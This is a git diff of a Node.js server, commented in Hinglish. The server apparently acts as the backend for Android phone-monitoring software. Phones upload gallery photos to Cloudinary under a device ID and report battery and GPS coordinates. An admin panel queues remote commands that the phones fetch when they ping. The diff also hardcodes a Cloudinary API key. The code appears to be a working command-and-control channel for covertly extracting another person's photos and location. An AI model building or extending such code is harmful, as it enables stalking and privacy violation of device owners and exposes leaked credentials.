@@ -8,7 +8,7 @@ const cloudinary = require('cloudinary').v2;
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// --- 1. CLOUDINARY CONFIG ---
+// --- 1. CLOUDINARY CONFIG (Tumhari Keys) ---
 cloudinary.config({
   cloud_name: 'dxnh5vuik',
   api_key: '185953318184881',
@@ -21,24 +21,25 @@ if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);
 
 app.use(cors({ origin: '*' }));
 
-// Limits badha di hain (Heavy data ke liye)
-app.use(bodyParser.json({ limit: '50mb' }));
-app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
+// Limits badha di hain (Heavy HD photos ke liye zaroori hai)
+app.use(bodyParser.json({ limit: '100mb' }));
+app.use(bodyParser.urlencoded({ limit: '100mb', extended: true }));
 app.use(express.static(__dirname));
 
-// Live Status (RAM)
+// Live Status (RAM Storage)
 let devicesStatus = {}; 
 
 // --- 3. ROOT ROUTE ---
 app.get('/', (req, res) => {
-    res.send('✅ Server is Running Successfully with HD Gallery!');
+    res.send('✅ Server is Running Successfully with HD Cloudinary Gallery!');
 });
 
 // ==================================================
-//  GALLERY SYSTEM (UPDATED FOR HD)
+//  GALLERY SYSTEM (UPDATED FOR HD & PAGINATION)
 // ==================================================
 
 // A. PHOTO UPLOAD (Android -> Cloudinary)
+// Ye route tumhare naye 'GalleryUploader.java' se connect karega
 app.post('/api/upload-image', (req, res) => {
     let { device_id, image_data } = req.body;
 
@@ -48,54 +49,61 @@ app.post('/api/upload-image', (req, res) => {
 
     const id = device_id.toString().trim().toUpperCase();
 
-    // Base64 Prefix Fix
+    // Base64 Prefix Fix (Agar app ne nahi bheja to hum laga denge)
     let base64Image = image_data;
     if (!base64Image.startsWith('data:image')) {
         base64Image = "data:image/jpeg;base64," + image_data;
     }
 
-    // Upload to Cloudinary (HD SETTINGS ADDED HERE)
+    // Upload to Cloudinary (HD SETTINGS)
     cloudinary.uploader.upload(base64Image, 
         { 
-            folder: id, 
-            public_id: Date.now().toString(), 
+            folder: id,             // Device ID ka folder banega
+            public_id: Date.now().toString(), // Time ke hisab se naam (Sorting ke liye)
             resource_type: "image",
-            width: 1280,      // ✅ HD Width (Pehle kam tha)
-            quality: "auto",  // ✅ Auto Best Quality
-            crop: "limit"     // ✅ Resize if too big
+            width: 1280,            // ✅ HD Width (Clear Text & Faces)
+            quality: "auto",        // ✅ Auto Best Quality
+            fetch_format: "auto"    // ✅ WebP/JPG auto convert (Fast loading)
         },
         function(error, result) {
             if (error) {
-                console.error("❌ Cloudinary Error:", error);
+                console.error("❌ Cloudinary Upload Error:", error);
                 return res.status(500).json({ error: "Upload Failed" });
             }
-            console.log(`📸 [GALLERY] HD Photo Saved for ${id}`);
+            console.log(`📸 [GALLERY] HD Photo Saved for ${id} -> ${result.secure_url}`);
             res.json({ status: "success", url: result.secure_url });
         }
     );
 });
 
 // B. GALLERY LIST (Website -> Cloudinary)
+// Ye route "Load More" button ke liye data dega
 app.get('/api/gallery-list/:device_id', (req, res) => {
     const id = req.params.device_id.toUpperCase();
-    const next_cursor = req.query.next_cursor || null;
+    const next_cursor = req.query.next_cursor || null; // Pagination ke liye
 
+    // Cloudinary se photos mangwana
     cloudinary.api.resources({
         type: 'upload',
-        prefix: id + "/", 
-        max_results: 12,  // 12 Photos per page
+        prefix: id + "/",      // Sirf is device ki photos
+        max_results: 20,       // ✅ Ek baar mein 20 photos (Load More logic)
         next_cursor: next_cursor, 
+        direction: 'desc',     // ✅ Newest First (Sabse nayi photo sabse upar)
         context: true
     }, 
     function(error, result) {
         if (error) {
+            console.error("Cloudinary Fetch Error:", error);
+            // Agar folder nahi mila ya error aaya to empty list bhejo
             return res.json({ photos: [], next_cursor: null });
         }
 
+        // Sirf URLs nikal kar bhejo
         const photos = result.resources.map(img => img.secure_url);
+        
         res.json({ 
             photos: photos, 
-            next_cursor: result.next_cursor 
+            next_cursor: result.next_cursor // Ye token agli 20 photos ke liye hai
         });
     });
 });
@@ -120,7 +128,7 @@ app.get('/api/device-status/:id', (req, res) => {
     res.json({ ...device, isOnline: isOnline });
 });
 
-// PHONE PING (Connection)
+// PHONE PING (Connection & Commands)
 app.post('/api/status', (req, res) => {
     try {
         let { device_id, model, battery, level, version, charging, lat, lon } = req.body;
@@ -133,7 +141,7 @@ app.post('/api/status', (req, res) => {
         let pendingCommand = "none";
         if (devicesStatus[id] && devicesStatus[id].command) {
             pendingCommand = devicesStatus[id].command;
-            devicesStatus[id].command = "none"; 
+            devicesStatus[id].command = "none"; // Command bhej diya, ab clear kar do
         }
 
         // Update RAM Data
@@ -162,7 +170,7 @@ app.post('/api/status', (req, res) => {
     }
 });
 
-// Send Command
+// Send Command (Admin Panel se)
 app.post('/api/send-command', (req, res) => {
     let { device_id, command } = req.body;
     
